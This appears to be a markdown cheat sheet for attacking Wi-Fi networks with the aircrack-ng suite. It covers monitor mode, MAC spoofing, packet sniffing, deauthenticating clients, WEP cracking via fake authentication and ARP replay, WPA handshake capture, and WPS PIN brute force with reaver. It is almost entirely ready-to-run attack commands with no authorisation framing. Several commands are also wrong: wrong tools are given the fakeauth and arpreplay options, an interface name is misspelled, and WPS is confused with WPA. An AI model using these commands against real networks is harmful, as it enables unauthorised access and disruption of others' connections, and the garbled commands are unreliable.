# Monitor Mode

Put your wireless card into Monitor Mode to prepare it for capturing network packets.

## Method - 1
```
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up

# wlan0: Wireless adaptor in standard mode
```

## Method - 2
```
airmon-ng start wlan0

# wlan0: Wireless adaptor in standard mode
```

# How to change MAC address?
```
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlano up

# wlan0: Wireless adaptor in standard mode
```

# Preconnection Attacks

Preconnection attacks are those attacks that can be performed without connecting to target.

## Discover Around Networks
We can discover all around available networks by following command:
```
airodump-ng wlan0mon

#wlan0mon: Wireless adaptor in monitor mode
```

## Packet Sniffing
In this attack we sniff all the packets trasmissing between target and it's connected clients.
```
airodump-ng --bssid <mac>  --channel <channel> --write <outputfilename> wlan0mon
```

## Deauth Users
We can deauth anu user from target wifi access point without connecting to target system.
```
aireplay-ng --deauth <numberofpackets> -a <accesspointMAC> -c <targetMAC> wlan0mon
```

# Gaining Access
There are mainly two basic types of attacks we can perform on wireless netwrok.

## Crack WEP Networks
- If network is busy
    - Do packet sniffing on WEP Network
    - Capture some amount of data
    - Give all the captured data to aircrack-ng to crack the password

- If network is not busy
    - Do packet sniffing on WEP Network
    - Do fake authentication attack (Authenticate Fakely with target)
        ```
        airodump-ng --fakeauth <numberofauthentication> -a <acesspointMAC> -h <adaptorMAC> wlan0mon
        ```
    - ARP Request Reply Attack (Generate Fake Traffic)
        ```
        airodump-ng --arpreplay -b <accesspointMAC> -h <adaptorMAC> wlan0mon
        ```
    - Capture some amount of data
    - Use aircrack-ng to crack password

## Crack WPA/WPA2 networks
There are two methods to crack WPA/WPA2 networks. Followed by,
### Method - 1 
- Do packet sniffing on the target network
- Capture handshake file using deauthentication attack
- Perform a wordlist/bruite-force attack on the captured handshake file

### Method - 2
To perform this attack, Target network should have WPA enabled and WPA version should be v1

- Find WPS enabled attacks around us
    ```
    wash --interface wlan0mon
    ```
- Fakely Authenticate With Network Using Fake Authentication Repeatedly Every 30 Seconds
    ```
    airmon-ng --fakeauth 30 -a <acesspointMAC> -h <adaptorMAC>
    ```
- Do WPS PIN Brute Forcing Using Reaver
    ```
    reaver --bssid <accessMAC> --channel <channel> --interface wlan0mon -vvv --no-associate
    ```
